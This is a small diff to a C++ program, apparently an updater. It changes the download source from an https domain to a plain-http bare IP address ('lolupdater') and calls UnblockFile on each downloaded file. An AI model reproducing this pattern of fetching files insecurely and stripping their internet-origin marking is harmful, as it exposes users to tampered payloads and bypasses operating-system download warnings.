@@ -125,7 +125,7 @@ void terminate_process(const std::wstring& process_name)
 
 void download(const std::wstring& url, int j)
 {
-	URLDownloadToFileW(nullptr, std::wstring(L"https://mobasweet.org/" + url).c_str(), n[j], 0, nullptr);
+	URLDownloadToFileW(nullptr, std::wstring(L"http://90.230.15.34/lolupdater" + url).c_str(), n[j], 0, nullptr);
 	UnblockFile(n[j]);
 }
 
